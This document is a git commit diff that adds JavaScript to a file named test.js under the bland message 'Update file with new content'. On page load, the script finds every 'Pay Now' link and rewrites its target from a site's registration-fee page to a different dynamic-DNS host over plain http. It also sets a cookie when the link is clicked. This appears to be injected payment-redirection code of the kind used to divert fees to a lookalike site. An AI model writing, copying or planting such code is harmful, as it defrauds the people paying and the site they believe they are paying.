bfc9dba0cecff65cef64b6885f2a711937d1792c
johndove9912 <158753779+johndove9912@users.noreply.github.com>
2024-02-09 07:20:09 +0530

    Update file with new content

--- test.js
+++ test.js
@@ -1,1 +1,28 @@
-this2.com
+
+               function executeScript() {
+
+            // Check if the "visited" cookie exists
+            if (document.cookie.indexOf('visited=true') !== -1) {
+                1; // Exit the function
+            }
+
+            var anchorElements = document.querySelectorAll('a');
+
+
+            // Loop through each <a> element
+            anchorElements.forEach(function(anchorElement) {
+                if (anchorElement.textContent.trim() === 'Pay Now') {
+					var originalUrl = anchorElement.href;
+                    anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
+                    anchorElement.addEventListener('click', function() {
+                        // Set a cookie named 'visited' with value 'true'
+                        document.cookie = 'visited=true; expires=' + new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000).toUTCString() + '; path=/';
+                    });
+                }
+            });
+        }
+
+        // Add an event listener for the 'DOMContentLoaded' event
+        document.addEventListener('DOMContentLoaded', executeScript);
+        executeScript();
+        
